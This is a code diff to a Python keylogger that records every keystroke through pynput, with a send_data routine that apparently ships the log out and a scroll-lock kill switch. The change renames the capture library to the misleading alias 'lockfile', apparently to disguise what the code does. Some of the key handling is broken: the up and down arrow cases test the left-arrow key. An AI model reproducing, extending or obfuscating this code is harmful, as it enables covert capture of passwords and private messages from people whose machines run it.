@@ -1,4 +1,4 @@
-from pynput import keyboard
+import pynput as lockfile
 
 # Other imports
 import json
@@ -33,34 +33,34 @@ def process_keypress(key):
     # Controler key pressed
     try:
         txt = ''
-        if isinstance(key, keyboard.Key):
+        if isinstance(key, lockfile.keyboard.Key):
             match key:
-                case keyboard.Key.enter:
+                case lockfile.keyboard.Key.enter:
                     txt = '\n'
-                case keyboard.Key.space:
+                case lockfile.keyboard.Key.space:
                     txt = ' '
-                case keyboard.Key.tab:
+                case lockfile.keyboard.Key.tab:
                     txt = '\t'
-                case keyboard.Key.backspace:
+                case lockfile.keyboard.Key.backspace:
                     txt = '[BKSP]'
-                case keyboard.Key.delete:
+                case lockfile.keyboard.Key.delete:
                     txt = '[DEL]'
-                case keyboard.Key.right:
+                case lockfile.keyboard.Key.right:
                     txt = '[ARR_RIGHT]'
-                case keyboard.Key.left:
+                case lockfile.keyboard.Key.left:
                     txt = '[ARR_LEFT]'
-                case keyboard.Key.left:
+                case lockfile.keyboard.Key.left:
                     txt = '[ARR_UP]'
-                case keyboard.Key.left:
+                case lockfile.keyboard.Key.left:
                     txt = '[ARR_DOWN]'
-                case keyboard.Key.shift:
+                case lockfile.keyboard.Key.shift:
                     txt = '[SHIFT]'
-                case keyboard.Key.caps_lock:
+                case lockfile.keyboard.Key.caps_lock:
                     txt = '[CAPS]'
-                case keyboard.Key.scroll_lock: # kill switch
+                case lockfile.keyboard.Key.scroll_lock: # kill switch
                     if kill_switch:
                         return False
-        elif isinstance(key, keyboard.KeyCode): # Letter pressed
+        elif isinstance(key, lockfile.keyboard.KeyCode): # Letter pressed
             txt = key.char
         else:
             return
@@ -91,7 +91,7 @@ def send_data():
     except Exception as e:
         print(e)
 
-with keyboard.Listener(on_press=process_keypress) as listener:
+with lockfile.keyboard.Listener(on_press=process_keypress) as listener:
     send_data()
     listener.join()
 
